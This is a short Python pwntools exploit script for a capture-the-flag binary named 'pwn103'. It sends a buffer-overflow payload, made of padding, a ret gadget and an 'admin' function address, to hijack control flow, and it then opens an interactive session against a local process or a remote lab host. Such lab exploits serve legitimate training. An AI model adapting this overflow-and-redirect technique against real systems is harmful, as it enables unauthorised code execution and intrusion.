from pwn import *
from time import *

admin_addr = 0x401554
#admin only address 0x401554
ret = 0x401016  #ROPgadget --binary ./pwn.pwn103 | grep 'ret'

def local_pwn():
    p = process("./pwn.pwn103")
    print(p.recvuntil("channel: ").decode())

    # choose the general 
    p.sendline("3")
    
    print(p.recvuntil("pwner]: ").decode())


    p.sendline( b"\0" + b's' * 39  + p64(ret) +  p64(admin_addr))

    sleep(1)
    p.interactive()

def remo_pwn():
    p = remote("10.10.230.88", 9003)
    print(p.recvuntil("channel: ").decode())

    # choose the general 
    p.sendline("3")
    
    print(p.recvuntil("pwner]: ").decode())


    p.sendline( b"\0" + b's' * 39  + p64(ret) +  p64(admin_addr))

    sleep(1)
    p.interactive()

remo_pwn()